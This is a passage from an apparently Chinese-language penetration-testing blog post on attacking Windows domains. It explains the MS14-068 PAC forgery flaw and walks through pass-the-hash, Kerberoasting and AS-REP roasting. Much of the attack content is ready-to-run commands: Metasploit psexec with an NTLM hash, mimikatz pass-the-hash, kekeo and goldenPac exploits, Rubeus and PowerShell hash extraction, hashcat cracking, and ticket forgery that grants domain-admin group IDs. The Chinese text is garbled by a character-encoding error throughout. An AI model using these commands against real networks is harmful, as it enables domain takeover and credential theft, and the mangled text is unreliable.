&#x3D;&gt; 192.168.64.133msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set lport 443lport &#x3D;&gt; 443msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set rhost 192.168.52.138rhost &#x3D;&gt; 192.168.52.138msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set SMBUser AdministratorSMBUser &#x3D;&gt; Administratormsf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set SMBPass 8a963371a63944419ec1adf687bb1be5 &#x2F;&#x2F;ä¸€èˆ¬é€‰æ‹©NTLM HASHSMBPass &#x3D;&gt; 8a963371a63944419ec1adf687bb1be5msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; run 2.ä½¿ç”¨mimikatz æˆ‘ä»¬åœ¨ç›®æ ‡æœºé‡Œæ”¾ç½®mimikatz.exe ç„¶åæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ sekurlsa::pth &#x2F;user:administrator &#x2F;domain:&quot;xxx.com&quot; &#x2F;ntlm:6542d35ed5ff6ae5e75b875068c5d3bc &#x2F;&#x2F;è‡ªè¡Œä¿®æ”¹ ä¹‹åä¾¿ä¼šå¼¹å‡ºä¸€ä¸ªcmdçª—å£ï¼Œåœ¨è¿™ä¸ªçª—å£é‡Œé“¾æ¥æœºå™¨å³å¯ net use \\\\192.168.222.131\\c$ 3.ä½¿ç”¨cobalt strike åœ¨cobalt strikeé‡Œæ‰¾åˆ°åŸŸæ§ï¼Œç„¶åä½¿ç”¨psexecæ¨¡å—ï¼Œé€‰æ‹©ä¸€ä¸ªæœ¬åœ°hashå³å¯ã€‚ MS14-068è¿™ä¸ªæ´çš„å±å®³å¾ˆå¤§ï¼Œå¯ä»¥è®©ä»»æ„åŸŸç”¨æˆ·ææƒåˆ°åŸŸç®¡ã€‚é€‚ç”¨ç‰ˆæœ¬: server 2000ä»¥ä¸Šè¡¥ä¸: kb3011780 PACPACæ˜¯kerberosåè®®é‡Œç”¨æ¥è§£å†³ç”¨æˆ·æƒé™åŠŸèƒ½æ‰€è®¾è®¡å‡ºçš„ä¸œè¥¿ã€‚åœ¨kerberosåè®®é‡Œé¢ï¼Œä¸€ä¸ªç”¨æˆ·ç”¨è‡ªå·±çš„hashæ‹¿åˆ°äº†TGTï¼Œæ¥ç€å‡­å€Ÿç€TGTæ‹¿åˆ°äº†TGSï¼Œæ¥ç€ç”¨TGSå»è®¿é—®æœåŠ¡ã€‚çœ‹ä¼¼åªè¦hashæ­£ç¡®ï¼Œç”¨æˆ·å°±èƒ½åˆ°å¤„è®¿é—®æœåŠ¡ï¼Œä½†æ˜¯æ‰€æœ‰æœåŠ¡éƒ½å¯ä»¥ç»™è¿™ä¸ªç”¨æˆ·æ‰€è®¿é—®å—ï¼Ÿè‚¯å®šæ˜¯ä¸è¡Œçš„ï¼Œæ‰€ä»¥å¾®è½¯åœ¨kerberosä¸ºäº†å®ç°ç”¨æˆ·æƒé™åˆ†çº§ï¼Œé‡‡ç”¨äº†PACã€‚PACè¢«è®¾è®¡ä¸ºå­˜åœ¨äºTGTé‡Œé¢ã€‚å®Œæ•´çš„kerberosæƒé™éªŒè¯æµç¨‹å¦‚ä¸‹ã€‚ 1ã€‚ç”¨æˆ·å‡­å€Ÿè‡ªå·±çš„hashåŠ å¯†æ—¶é—´æˆ³å¹¶å‘é€æ˜æ–‡ç”¨æˆ·ååˆ°KDCï¼ŒKDCè®¤è¯ç”¨æˆ·æˆåŠŸåè¿”å›è¢«krbtgtç”¨æˆ·hashåŠ å¯†çš„TGT(å†…æœ‰ticektåŒ…å«ç€PAC)ï¼Œä»¥åŠç”¨æˆ·è‡ªèº«hashåŠ å¯†çš„login session key 2.ç”¨æˆ·å‡­å€ŸTGTç¥¨æ®å‘KDCå‘èµ·æŒ‡å®šæœåŠ¡çš„TGS_REQã€‚KDCç”¨krbtgt hashè§£å¯†ï¼Œè‹¥è§£å¯†æˆåŠŸåˆ™ç›´æ¥è¿”å›æœåŠ¡hashåŠ å¯†çš„TGSï¼ˆè¿™é‡Œå¹¶æ²¡è€ƒè™‘ç”¨æˆ·çš„æƒé™ï¼Œç›´æ¥è¿”å›äº†TGSï¼‰ 3.ç”¨æˆ·ç”¨TGSå‘æœåŠ¡å‘èµ·è¯·æ±‚ï¼ŒæœåŠ¡ç”¨è‡ªå·±çš„hashè§£å¯†TGSåè·å¾—PACï¼Œæ‹¿ç€PACå‘KDCè¯¢é—®è¯¥ç”¨æˆ·æ˜¯å¦æœ‰æƒé™è®¿é—®ã€‚KDCæ‹¿åˆ°PACåå†æ¬¡è§£å¯†ï¼Œå¾—åˆ°äº†PACé‡Œçš„ ç”¨æˆ·çš„sidï¼Œä»¥åŠæ‰€åœ¨çš„ç»„ï¼Œå†åˆ¤æ–­ç”¨æˆ·æ˜¯å¦æœ‰è®¿é—®æœåŠ¡çš„æƒé™ï¼ˆæœ‰äº›æœåŠ¡ä¸ä¼šéªŒè¯KDCï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´ç™½é“¶ç¥¨æ®æ”»å‡») PACè‡ªèº«çš„ç»“æ„ PACåœ¨Ticketä¸­çš„ç»“æ„ åˆè¿™ä¸ªå›¾å¯ä»¥çŸ¥é“,PACåªä¸è¿‡æ˜¯ticketé‡ŒAuthorization DATAçš„ä¸€ä¸ªåˆ†æ”¯ã€‚è€ŒAuthorization dataçš„ç»“æ„æ˜¯è¿™æ ·çš„ AuthorizationData ::= SEQUENCE OF SEQUENCE {ad-type [0] Int32,ad-data [1] OCTET STRING } ad-typeä¸­å°±æœ‰è¿™ä¹ˆä¸€ä¸ªç±»å‹ AD-IF-RELEVANT å¯¹åº”æ•°å­—1,ç”±ä¸Šä¸Šå›¾å¯çŸ¥è¿™æ˜¯PACçš„å¤–å£³ã€‚è‹¥ç±»å‹ä¸º AD-IF-RELEVAN ,é‚£ä¹ˆad-dataä¹Ÿæ˜¯ä¸€ä¸ª AuthorizationDataç±»å‹çš„ç»“æ„ä½“ï¼Œä¹Ÿæœ‰ad-type å’Œad-data.é‚£ä¹ˆè¿™ä¸ªå¤–å£³ad-dataçš„ad-typeå°±æ˜¯æ¬¡å¤–å£³AD-WIN2K-PAC äº†,ä¸ AD-WIN2K-PAC è¿™ä¸ªad-typeå¯¹åº”çš„ad-dataå°±æ˜¯ä¸€æ®µè¿ç»­ç©ºé—´ã€‚ è¿™æ®µç©ºé—´åŒ…å«ä¸€ä¸ªå¤´éƒ¨PACTYPEä»¥åŠè‹¥å¹²ä¸ªPAC_INFO_BUFFER ã€‚PACTYPEåŒ…å«çš„æ˜¯ cBuffers,ç‰ˆæœ¬ä»¥åŠç¼“å†²åŒº ã€‚PAC_INFO_BUFFERæ˜¯key-valueå‹çš„ã€‚PAC_INFO_BUFFERçš„keyæœ‰å¾ˆå¤š 0x00000001 ç™»å½•ä¿¡æ¯ã€‚PACç»“æ„å¿…é¡»åŒ…å«ä¸€ä¸ªè¿™ç§ç±»å‹çš„ç¼“å†²åŒºã€‚å…¶ä»–ç™»å½•ä¿¡æ¯ç¼“å†²åŒºå¿…é¡»è¢«å¿½ç•¥ã€‚ 0x00000002 å‡­è¯ä¿¡æ¯ã€‚PACç»“æ„ä¸åº”åŒ…å«å¤šä¸ªæ­¤ç±»ç¼“å†²åŒºã€‚ç¬¬äºŒæˆ–åç»­å‡­è¯ä¿¡æ¯ç¼“å†²åŒºåœ¨æ¥æ”¶æ—¶å¿…é¡»è¢«å¿½ç•¥ã€‚ 0x00000006 æœåŠ¡å™¨æ ¡éªŒå’Œã€‚PACç»“æ„å¿…é¡»åŒ…å«ä¸€ä¸ªè¿™ç§ç±»å‹çš„ç¼“å†²åŒºã€‚å…¶ä»–ç™»å½•æœåŠ¡å™¨æ ¡éªŒå’Œç¼“å†²åŒºå¿…é¡»è¢«å¿½ç•¥ã€‚ 0x00000007 KDCï¼ˆç‰¹æƒæœåŠ¡å™¨ï¼‰æ ¡éªŒå’Œï¼ˆç¬¬2.8èŠ‚ï¼‰ã€‚PACç»“æ„å¿…é¡»åŒ…å«ä¸€ä¸ªè¿™ç§ç±»å‹çš„ç¼“å†²åŒºã€‚é™„åŠ çš„KDCæ ¡éªŒå’Œç¼“å†²åŒºå¿…é¡»è¢«å¿½ç•¥ã€‚ 0x0000000A å®¢æˆ·åç§°å’Œç¥¨è¯ä¿¡æ¯ã€‚PACç»“æ„å¿…é¡»åŒ…å«ä¸€ä¸ªè¿™ç§ç±»å‹çš„ç¼“å†²åŒºã€‚é™„åŠ çš„å®¢æˆ·å’Œç¥¨æ®ä¿¡æ¯ç¼“å†²åŒºå¿…é¡»è¢«å¿½ç•¥ã€‚ 0x0000000B å—çº¦æŸçš„å§”æ´¾ä¿¡æ¯ã€‚PACç»“æ„å¿…é¡»åŒ…å«ä¸€ä¸ªS4U2proxyè¯·æ±‚çš„æ­¤ç±»ç¼“å†²åŒºï¼Œå¦åˆ™ä¸åŒ…å«ã€‚é™„åŠ çš„å—çº¦æŸçš„å§”æ‰˜ä¿¡æ¯ç¼“å†²åŒºå¿…é¡»è¢«å¿½ç•¥ã€‚ 0x0000000C ç”¨æˆ·ä¸»ä½“åç§°ï¼ˆUPNï¼‰å’ŒåŸŸåç³»ç»Ÿï¼ˆDNSï¼‰ä¿¡æ¯ã€‚PACç»“æ„ä¸åº”åŒ…å«å¤šä¸ªè¿™ç§ç±»å‹çš„ç¼“å†²åŒºã€‚æ¥æ”¶æ—¶å¿…é¡»å¿½ç•¥ç¬¬äºŒä¸ªæˆ–åç»­çš„UPNå’ŒDNSä¿¡æ¯ç¼“å†²åŒºã€‚ 0x0000000D å®¢æˆ·ç´¢å–ä¿¡æ¯ã€‚PACç»“æ„ä¸åº”åŒ…å«å¤šä¸ªè¿™ç§ç±»å‹çš„ç¼“å†²åŒºã€‚é™„åŠ çš„å®¢æˆ·è¦æ±‚ä¿¡æ¯ç¼“å†²åŒºå¿…é¡»è¢«å¿½ç•¥ã€‚ 0x0000000E è®¾å¤‡ä¿¡æ¯ã€‚PACç»“æ„ä¸åº”åŒ…å«å¤šä¸ªè¿™ç§ç±»å‹çš„ç¼“å†²åŒºã€‚é™„åŠ çš„è®¾å¤‡ä¿¡æ¯ç¼“å†²åŒºå¿…é¡»è¢«å¿½ç•¥ã€‚ 0x0000000F è®¾å¤‡å£°æ˜ä¿¡æ¯ã€‚PACç»“æ„ä¸åº”åŒ…å«å¤šä¸ªè¿™ç§ç±»å‹çš„ç¼“å†²åŒºã€‚é™„åŠ çš„è®¾å¤‡å£°æ˜ä¿¡æ¯ç¼“å†²åŒºå¿…é¡»è¢«å¿½ç•¥ã€‚ å…¶ä¸­æ¯”è¾ƒé‡è¦çš„æ˜¯1,6å’Œ7 0x00000001 KERBVALIDATIONINFO è¿™ä¸ªç»“æ„ç”¨äºå­˜å‚¨ç”¨æˆ·çš„èº«ä»½ä¿¡æ¯.å®ƒæ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼Œè¿™ä¸ªç»“æ„ä½“æ˜¯è¿™æ ·çš„(å¾…ä¼šæˆ‘ä»¬ä¼ªé€ PACçš„æ—¶å€™ä¸»è¦å°±æ˜¯ä¼ªé€ æ­¤å¤„é¢ UserId ä»¥åŠ PGROUP_MEMBERSHIP GroupIds ï¼‰æœåŠ¡å™¨è§£åŒ…PACåæå–ç”¨æˆ·çš„sidä»¥åŠgroupidï¼Œç„¶åå°±æŠŠå½“å‰å‘åŒ…è¿‡æ¥çš„ç”¨æˆ·æƒé™å½“æˆsidï¼Œgroupidçš„æƒé™å¤„ç†ã€‚ typedef struct _KERB_VALIDATION_INFO &#123;FILETIME LogonTime;FILETIME LogoffTime;FILETIME KickOffTime;FILETIME PasswordLastSet;FILETIME PasswordCanChange;FILETIME PasswordMustChange;RPC_UNICODE_STRING EffectiveName;RPC_UNICODE_STRING FullName;RPC_UNICODE_STRING LogonScript;RPC_UNICODE_STRING ProfilePath;RPC_UNICODE_STRING HomeDirectory;RPC_UNICODE_STRING HomeDirectoryDrive;USHORT LogonCount;USHORT BadPasswordCount;ULONG UserId; &#x2F;&#x2F;ç”¨æˆ·çš„sidULONG PrimaryGroupId;ULONG GroupCount;[size_is(GroupCount)] PGROUP_MEMBERSHIP GroupIds;&#x2F;&#x2F;ç”¨æˆ·æ‰€åœ¨çš„ç»„ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥ç¯¡æ”¹çš„è¿™ä¸ªçš„è¯ï¼Œæ·»åŠ ä¸€ä¸ª500(åŸŸç®¡ç»„)ï¼Œé‚£ç”¨æˆ·å°±æ˜¯åŸŸç®¡äº†ã€‚åœ¨ms14068 PACç­¾åè¢«ç»•è¿‡ï¼Œç”¨æˆ·å¯ä»¥è‡ªå·±åˆ¶ä½œPACçš„æƒ…å†µåº•ä¸‹ï¼Œpykekå°±æ˜¯é å‘è¿™ä¸ªåœ°æ–¹å†™è¿›åŸŸç®¡ç»„ï¼Œæˆä¸ºä½¿å¾—æ”¹ç”¨æˆ·å˜æˆåŸŸç®¡ULONG UserFlags;USER_SESSION_KEY UserSessionKey;RPC_UNICODE_STRING LogonServer;RPC_UNICODE_STRING LogonDomainName;PISID LogonDomainId;ULONG Reserved1[2];ULONG UserAccountControl;ULONG SubAuthStatus;FILETIME LastSuccessfulILogon;FILETIME LastFailedILogon;ULONG FailedILogonCount;ULONG Reserved3;ULONG SidCount;[size_is(SidCount)] PKERB_SID_AND_ATTRIBUTES ExtraSids;PISID ResourceGroupDomainSid;ULONG ResourceGroupCount;[size_is(ResourceGroupCount)] PGROUP_MEMBERSHIP ResourceGroupIds;&#125; KERB_VALIDATION_INFO; 0x00000006å’Œ0x00000007 6æ˜¯æœåŠ¡å™¨æ ¡éªŒå’Œï¼Œç”±serverå¯†ç åŠ å¯†ã€‚7æ˜¯KDCæ ¡éªŒå’Œï¼ŒåˆKDCå¯†ç åŠ å¯†ã€‚å­˜åœ¨çš„ç›®çš„å°±æ˜¯é˜²æ­¢PACè¢«ç¯¡æ”¹ã€‚ MS14068è¿™ä¸ªæ¼æ´çš„äº§ç”Ÿä¸»è¦æ˜¯å¾®è½¯çŠ¯ä¸‹äº†ä¸‰ä¸ªé”™è¯¯ï¼š1.å¯¹æ ¡éªŒå’Œçš„ç®—æ³•å®ç°ä¸å¤Ÿç»†è‡´ï¼Œå¯¼è‡´åœ¨æ ¡éªŒå’Œç”Ÿæˆæ—¶å¯ä»¥ä¸ç”¨ç®¡serverå’ŒKDCçš„hashç›´æ¥ç”Ÿæˆï¼Œè€Œä¸”ç”Ÿæˆå‡ºæ¥çš„æ ¡éªŒå’Œè¿˜æ˜¯åˆæ³•çš„2.PACå¯ä»¥ä¸ç”¨æ”¾åœ¨TGTä¸­ï¼Œå³ä½¿æ˜¯è¿™æ ·ï¼ŒKDCä¹Ÿèƒ½ç…§å¸¸è§£æå‡ºTGTå¤–çš„PAC3.ä¸‹é¢å†è¯´ é‚£ä¹ˆè¿™ä¸ªæ¼æ´å¤§è‡´çš„æ”»å‡»åŸç†æ˜¯ä»€ä¹ˆå‘¢ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬åœ¨as_requestçš„æ—¶å€™ï¼ŒæŠŠinclude-PACæ ‡å¿—è®¾ç½®ä¸ºfalseï¼Œé‚£ä¹ˆas_repå°±ä¸ä¼šåœ¨TGTä¸­è¿”å›PACäº†ã€‚ç„¶åè¿™ä¸ªæ—¶å€™æˆ‘ä»¬è‡ªå·±ä¼ªé€ ä¸€ä¸ªpacï¼Œåœ¨TGS_REQæ—¶å‘è¿‡å»å°±è¡Œäº†ã€‚ä¼ªé€ çš„pacä¿®æ”¹USER SID&amp;GROUP SID(åœ¨PACçš„ 0x00000001 KERBVALIDATIONINFO ç»“æ„)å¯ä»¥æŠŠæˆ‘ä»¬çš„ç”¨æˆ·æƒé™æ”¹åˆ°å¾ˆé«˜ï¼ˆåŸŸç®¡ï¼‰ï¼Œä»è€Œè¾¾åˆ°ææƒåˆ°åŸŸç®¡çš„èƒ½åŠ›ã€‚ é‚£ä¹ˆä¼ªé€ PACï¼Œæˆ‘ä»¬å°±é‡åˆ°äº†ä¸¤ä¸ªé—®é¢˜ï¼š1.pacé‡Œæœ‰æ ¡éªŒå’Œï¼Œé˜²æ­¢è‡ªå·±è¢«ç¯¡æ”¹ï¼Œæˆ‘ä»¬å¾—æœ‰serverå’ŒKDCå¯†ç æ‰èƒ½ä½¿æ ¡éªŒå’Œåˆæ³•ã€‚2.pacæŒ‰ç†è¯´åº”è¯¥åœ¨TGTé‡Œï¼Œä½†æ˜¯TGTæ˜¯è¢«kbrtgt hashåŠ å¯†çš„ï¼Œæˆ‘ä»¬æ— æ³•è·å–kbrtgt hashç»§è€Œæ— æ³•ä¿®æ”¹TGTå†…å®¹ï¼Œç»§è€Œä¸èƒ½ä¿®æ”¹PACã€‚ æ¥è¯´è¯´å¦‚ä½•ç»•è¿‡PACæ ¡éªŒå’Œé—®é¢˜ã€‚æˆ‘ä»¬åˆšåˆšè¯´è¿‡ï¼Œ0x00000006å’Œ0x00000007 è¿™ä¸¤ä¸ªç»“æ„çš„å­˜åœ¨æ˜¯ä¸ºäº†é˜²æ­¢PACè¢«ç¯¡æ”¹ï¼Œè¿™ä¸ªæ ¡éªŒå’Œç®—æ³•é‡‡ç”¨çš„æ˜¯ä¸ªå«checksumç®—æ³•ç„¶åæŠŠkdc hashå’ŒæœåŠ¡hashå½“ä½œkeyå¯¹PACåŠ å¯†äº§ç”Ÿçš„å€¼ï¼Œä»è€Œé˜²æ­¢PACè¢«ç¯¡æ”¹ã€‚ä½†æ˜¯checksumç®—æ³•æ˜¯æœ‰å¾ˆå¤šç§çš„ï¼Œmd5ä¹Ÿæ˜¯checksumçš„åˆ†æ”¯ä¹‹ä¸€ï¼Œä¿®æ”¹PACåï¼Œæˆ‘ä»¬åªéœ€è®¾ç½®åŠ å¯†ç®—æ³•ä¸ºMD5å¹¶ç”¨MD5ç®—æ³•å¯¹0x00000001 KERBVALIDATIONINFOè¿›è¡ŒåŠ å¯†ï¼Œå°†ç”Ÿæˆçš„å€¼æ”¾å…¥ä¸¤ä¸ªæ£€éªŒå’Œå³å¯ï¼ŒKDCæ‹¿åˆ°0x00000001 KERBVALIDATIONINFOï¼Œå¹¶ä¸”é€šè¿‡è§£ææ•°æ®åŒ…è·å–å½“å‰åŠ å¯†ç®—æ³•ä¸ºMD5ï¼Œç„¶åå¯¹å…¶è¿›è¡ŒMD5åŠ å¯†ï¼Œè‹¥åŠ å¯†ç»“æœä¸æ ¡éªŒå’Œä¸€è‡´ï¼Œåˆ™è®¤ä¸ºPACæœªè¢«ä¿®æ”¹ å†æ¥è¯´è¯´å¦‚ä½•ç»•è¿‡krbtgt hashåŠ å¯†TGTçš„é—®é¢˜ã€‚å› ä¸ºæˆ‘ä»¬åœ¨AS_REQæ—¶è®¾ç½®include-PACä¸ºfalseï¼ŒTGTé‡Œå°±ä¸ä¼šåŒ…å«PACäº†ã€‚é‚£ä¹ˆæˆ‘ä»¬åœ¨TGS_REQæ—¶å¦‚ä½•æŠŠPACä¼ é€’ç»™KDCï¼Ÿåªéœ€è¦æŠŠPACæ”¾å…¥req-bodyå³å¯ã€‚è¿™æ ·KDCä¾æ—§ä¼šæ­£å¸¸è§£æè¿™ä¸ªTGS_REQåŒ… æ³¨æ„TGS_REQé‡Œçš„include-pacä¾æ—§æ˜¯falseã€‚ç„¶åKDCæ¥æ”¶åˆ°PACåä¼šå…ˆè§£å¯†TGTæ‹¿åˆ°authenticatoré‡Œçš„keyå¯¹PACè¿›è¡Œè§£å¯†ï¼ˆTGS_REQæ—¶åŠ å¯†PACç”¨çš„keyæ˜¯éšæœºç”Ÿæˆçš„ï¼Œè¿™ä¸ªkeyä¼šæ”¾åœ¨authenticatoré‡Œï¼‰ï¼Œç„¶åéªŒè¯ä¸€ä¸‹PACçš„ç­¾åï¼Œè‹¥æˆåŠŸç„¶åæŠŠè§£å¯†å¾—åˆ°çš„PACé‡‡ç”¨server keyå’ŒKDC keyé‡æ–°ç”Ÿæˆæ ¡éªŒå’Œï¼Œæ‹¼æ¥æˆä¸€ä¸ªæ–°çš„TGTè¿”å›ç»™å®¢æˆ·ç«¯ã€‚ä¸Šé¢è¿™ä¸€æ®µå°±æ˜¯å¾®è½¯çŠ¯ä¸‹çš„ç¬¬ä¸‰ä¸ªé”™è¯¯ï¼Œå¾ˆä¸å¯æ€è®®ï¼Œå±…ç„¶è«åå…¶å¦™çš„è¿”å›äº†ä¸€ä¸ªåŒ…å«äº†PACçš„TGTå›æ¥ã€‚æ€»ç»“æ¥è¯´å°±æ˜¯æ„é€ äº†ä¸€ä¸ªç•¸å½¢çš„TGS_REQï¼Œä»TGS_RESå¾—åˆ°äº†ä¸€ä¸ªåŒ…å«ä¼ªé€ PACçš„TGTã€‚ åŸç†å°±æ˜¯ä¸Šé¢è¿™äº›ï¼Œç„¶åæˆ‘ä»¬ç”¨åŒ…å«ä¼ªé€ PACçš„TGTåˆ°å¤„è®¿é—®æœåŠ¡å³å¯ã€‚ M14068åˆ©ç”¨1.å·¥å…·kekeo https://github.com/gentilkiwi/kekeo/releases/tag/2.2.0-20200718 å…·ä½“æ–¹æ³•ä¸ºï¼Œåœ¨kekeoé‡Œå…ˆæ‰§è¡Œ kerberos::purgeæ¸…ç©ºç¥¨æ®ç„¶åå†æ‰§è¡Œ exploit::ms14068 /user:xxx /password:xxx /domain:xxx /pttå³å¯ã€‚ ç„¶åå°±dir \\åŸŸæ§\\c$ è¯•è¯•ï¼Œå¦‚æœå¯ä»¥å°±è¯´æ˜ææƒæˆåŠŸäº†ï¼ˆä¸æ˜¯æ¯æ¬¡éƒ½èƒ½æˆåŠŸçš„) 2.golenpac https://github.com/maaaaz/impacket-examples-windows/blob/master/goldenPac.exe è¿™ä¸ªå·¥å…·å¥½ç”¨, æ‰§è¡Œç±»ä¼¼ä¸Šè¿°å‘½ä»¤ï¼Œå°±èƒ½è¿”å›ä¸€ä¸ªåŸŸæ§çš„ systemæƒé™çš„cmd shellå›æ¥ï¼Œæ„Ÿè§‰è›®å¥½ç”¨å¦å¤–åœ¨æœ€åæŒ‡å®šåŸŸæ§æœºå™¨æ—¶ï¼Œå¯ä»¥æŒ‡å®šåŸŸæ§ä»¥å¤–çš„æœºå™¨å¹¶è·å–ä»–ä»¬çš„æœ¬åœ°systemæƒé™ç”¨æˆ·.ä½†è¿”å›çš„ä¼¼ä¹ä¸æ˜¯åŸŸæ§ï¼Ÿ kerberoastKerberoastæ”»å‡»åŸç†: æ”»å‡»è€…ä» TGS-REP ä¸­æå–åŠ å¯†çš„æœåŠ¡ç¥¨è¯ã€‚ ç”±äºæœåŠ¡ç¥¨è¯æ˜¯ç”¨é“¾æ¥åˆ°è¯·æ±‚ SPN çš„å¸æˆ·çš„å“ˆå¸ŒåŠ å¯†çš„ï¼Œæ‰€ä»¥æ”»å‡»è€…å¯ä»¥ç¦»çº¿ç ´è§£è¿™ä¸ªåŠ å¯†å—ï¼Œæ¢å¤å¸æˆ·çš„æ˜æ–‡å¯†ç  How to get SPNå¦‚ä½•å¾—åˆ°åŸŸä¸­çš„æ‰€æœ‰SPNï¼Ÿ 1.setspnå¾ˆç®€å•ï¼Œåªéœ€æ‰§è¡Œ setspn -q *&#x2F;* å³å¯ 2.kerberoastå·¥å…·é›†çš„GetUserSpns powershellè„šæœ¬ How to get HASHå¦‚ä½•å¾—åˆ°hashï¼Ÿæœ‰å¦‚ä¸‹æ–¹æ³• 1.Rubeus.exe è¿™ä¸ªå·¥å…·githubä¸Šå°±æœ‰ï¼Œä½†æ˜¯cloneä¸‹æ¥åéœ€è¦è‡ªå·±ç¼–è¯‘æˆexe. ç„¶åæ‰§è¡Œ Rubeus.exe kerberoastæŒ‡ä»¤å³å¯ 2.mimikatz mimikatzçœŸçš„ç¥å™¨ã€‚é€šè¿‡å‘½ä»¤ kerberos::ask /target:ä½ æ‰€æŒ‡å®šçš„SPN, å³å¯é€šè¿‡è®¤è¯çš„æ–¹å¼å¾—åˆ°ä¸€ä¸ªSTã€‚ç„¶åæˆ‘ä»¬åœ¨kerberos::listé‡Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æƒ³è¦çš„ST 3.powershell è¶Šæ¥è¶Šå‘ç°powershellåœ¨åŸŸæ¸—é€ä¸­çš„é‡è¦æ€§äº†è¾“å…¥ä»¥ä¸‹æŒ‡ä»¤ï¼Œå³å¯å®ŒæˆHASHè·å– Add-Type -AssemblyName System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MySQL&#x2F;win7.xie.com:3306&#x2F;MySQL&quot; ç„¶åmimikatzå¯¼å‡ºå³å¯ How to export hashè·å¾—äº†STç¥¨æ®ï¼Œä½†æ€ä¹ˆå¯¼å‡ºï¼Ÿ 1.mimikatz å¯¼å‡ºæ‰€æœ‰ç¥¨æ® å¯ä»¥å‘ç°ç”Ÿæˆäº†kirbiæ–‡ä»¶ã€‚è¿™å°±æ˜¯æˆ‘ä»¬æ‰€éœ€è¦çš„hashäº† 2.Empire Powershell æ¡†æ¶ github:https://github.com/EmpireProject/Empire æˆ‘ä»¬é€šè¿‡è¿™ä¸ªæ¡†æ¶å¯ä»¥å¯¼å‡ºhashcatæ ¼å¼çš„hash. Import-Module .\\Invoke-Kerberoast.ps1;Invoke-Kerberoast -outputFormat Hashcat How to crack HASHå¦‚ä½•ç ´è§£HASH? 1.HASHCAT è¿™ä¸ªå·¥å…·éœ€è¦è®©hashæ ¼å¼ä¸ºhashcatæ¨¡å¼æ‰èƒ½è¿›è¡Œç ´è§£ã€‚kribiæ–‡ä»¶ä¸èƒ½æ”¾å…¥hashcatè¿›è¡Œç ´è§£. hashcat -m 13110 pass.txt hash.txt 2.kerberoastä¸­çš„tgsrepcrack.py æ”¯æŒkribiæ–‡ä»¶ç ´è§£ python3 tgsrepcrack.py pass.txt xxx.kribi How to use Kerberoastæ—¢ç„¶æˆ‘ä»¬éƒ½æŠŠSTçš„åŠ å¯†hashéƒ½ç ´è§£äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥éšä¾¿æ”¹STä¸­çš„ç¥¨æ®å†…å®¹äº†..\\ è¿™é‡Œä½¿ç”¨çš„æ˜¯kerberoastå·¥å…·é›†é‡Œçš„kerberoast.py python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -u 500python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -g 512## å°†ç¥¨æ®æƒé™æ”¹ä¸ºadministratorkerberos::ptt PENTESTLAB.kirbi #å°†ç¥¨æ®æ³¨å…¥åˆ°å†…å­˜ AS_REP Roastè¾ƒKerberoastæ¥è¯´ï¼Œæ¯”è¾ƒé¸¡è‚‹ã€‚å®ƒçš„åŸç†æ˜¯åœ¨ä¸å¼€å¯kerberosé¢„èº«ä»½éªŒè¯çš„å‰æä¸‹ï¼Œè·å¾—å…¶ä»–ç”¨æˆ·çš„AS_RESï¼Œå¹¶ç ´è§£åŠ å¯†session key çš„ client hashã€‚ How to get HASH1.Rubeus Rubeus.exe asreproast ç„¶åå°±ä¼šæœç´¢åŸŸä¸­ä¸éœ€è¦kerberosé¢„éªŒè¯çš„ç”¨æˆ·ï¼Œå¹¶è·å¾—ASREPã€‚ 2.Empireæ¡†æ¶ä¸ ASREPRoast.ps1 ä½¿ç”¨Empireæ¡†æ¶ä¸‹çš„powerview.ps1æŸ¥æ‰¾åŸŸä¸­è®¾ç½®äº† â€œä¸éœ€è¦kerberosé¢„èº«ä»½éªŒè¯â€ çš„ç”¨æˆ· Import-Module .\\powerview.ps1 Get-DomainUser -PreauthNotRequired ç„¶åç”¨ ASREPRoast.ps1 ï¼šhttps://github.com/HarmJ0y/ASREPRoast è·å–æŒ‡å®šç”¨æˆ·çš„AS-REPhash Import-Module ASREPRoast.ps1Get-ASREPHash -USER xx -Domain xx |Out-file -Encoding ASCII hash.txt å°±ä¼šç”Ÿæˆä¸€ä¸ªhashæ•°æ®æ–‡ä»¶äº† How to crack hashå°†ç”Ÿæˆçš„HASHä¿å­˜èµ·æ¥ï¼Œå¹¶åœ¨ä¸‹å›¾å¤„åŠ å…¥$23 ç„¶åä¸¢ç»™hashcat è·‘ hashcat -m 18200 hash.txt pass.txt æ³¨æ„è¿™é‡Œçš„pass.txtæ˜¯è‡ªå·±çš„æ˜æ–‡å­—å…¸â€¦ä¹‹å‰æˆ‘è¿˜ä¸€ç›´ä»¥ä¸ºæ˜¯çˆ†ç ´å‡ºæ¥çš„ç»“æœ.åŸæ¥æ˜¯ä¸€ä¸ªä¸€ä¸ªçš„ç”¨æ˜æ–‡å­—å…¸å»çˆ†ç ´ã€‚ 